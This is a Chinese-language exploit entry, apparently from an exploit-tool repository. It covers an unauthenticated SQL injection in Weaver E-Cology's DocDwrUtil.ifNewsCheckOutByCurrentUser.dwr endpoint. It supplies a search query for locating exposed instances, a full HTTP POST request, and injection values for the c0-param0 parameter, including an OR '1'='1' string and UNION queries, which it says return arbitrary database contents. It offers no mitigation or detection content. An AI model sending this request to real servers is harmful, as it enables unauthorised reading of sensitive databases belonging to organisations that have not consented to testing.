---
source: "LittleBear4/OA-EXPTOOL"
---

# 泛微E-Cology ifNewsCheckOutByCurrentUser.dwr SQL注入漏洞

## 漏洞描述

泛微 E-Cology 的 DWR 接口 `/dwr/call/plaincall/DocDwrUtil.ifNewsCheckOutByCurrentUser.dwr` 中 `c0-param0` 参数存在SQL注入漏洞。攻击者无需登录，通过构造 DWR 调用请求可执行任意 SQL 查询，获取数据库敏感信息。

## 漏洞影响

```
泛微 E-Cology
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

```http
POST /dwr/call/plaincall/DocDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Content-Type: text/plain

callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1
c0-param1=string:1
```

将 `c0-param0` 的值替换为 SQL 注入语句（如 `string:1' OR '1'='1` 或 UNION 查询）即可执行任意 SQL，响应中回显查询结果。
